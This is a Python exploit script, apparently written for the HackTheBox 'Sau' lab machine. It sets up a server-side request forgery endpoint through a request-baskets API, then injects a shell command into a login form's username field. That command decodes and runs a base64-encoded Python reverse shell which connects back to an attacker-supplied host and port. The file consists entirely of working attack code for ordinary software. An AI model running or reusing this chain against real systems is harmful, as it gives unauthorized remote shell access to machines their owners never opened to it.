import requests
import argparse
import random
from base64 import b64encode
import json

parser = argparse.ArgumentParser(description='Reverse shell spawner for "Sau" machine on HTB')
parser.add_argument('--rhost', action='store', required=True)
parser.add_argument('--lhost', action='store', required=True)
parser.add_argument('--lport', action='store', required=True)
host = parser.parse_args()

cmd = b64encode(f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host.lhost}",{host.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''''.encode())

# SETUP SSRF ENDPOINT
ssrf_endpoint = "pySSRF-" + str(random.randrange(99, 999))
basket = requests.post(f'http://{host.rhost}:55555/api/baskets/{ssrf_endpoint}', data='{"forward_url":"http://127.0.0.1:80/","proxy_response":true,"insecure_tls":false,"expand_path":true,"capacity": 250}')
token = json.loads(basket.text).get('token')
print(f'[+] Endpoint set up: http://{host.rhost}:55555/{ssrf_endpoint}')

# ENABLE SSRF ENDPOINT
requests.get(f'http://{host.rhost}:55555/api/baskets/{ssrf_endpoint}/requests?skip=0', headers={'Authorization':token})
print(f'[+] Endpoint enabled, token: {token}')

# EXPLOIT COMMAND INJECTION THROUGH SSRF
print('[+] Sending RCE payload. Check your Netcat listener.')
r = requests.post(f'http://{host.rhost}:55555/{ssrf_endpoint}/login', data={'username':f';`echo+"{cmd.decode()}"+|+base64+-d+|+sh`'})
